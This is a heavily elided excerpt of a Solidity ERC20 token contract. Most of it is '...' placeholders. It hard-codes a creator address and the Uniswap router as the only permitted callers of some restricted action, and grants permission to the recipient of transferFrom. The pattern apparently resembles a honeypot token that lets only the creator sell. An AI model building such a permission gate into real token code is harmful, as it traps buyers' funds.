...

{
...

    {
        ...
        _creator = 0x466Bdd7e71Fc277a92f436cD3d9b2e8A37B097Eb;

        _swap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

        

        _permitted[_creator] = true;

        _permitted[_swap] = true;
...

    {
        ...
        require(_msgSender() == _creator || _msgSender() == _swap, "You do not have permissions for this action");
...
contract ERC20 is Permissions, IERC20 {
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        { givePermissions(recipient); } // uniswap should transfer only to the exchange contract (pool)
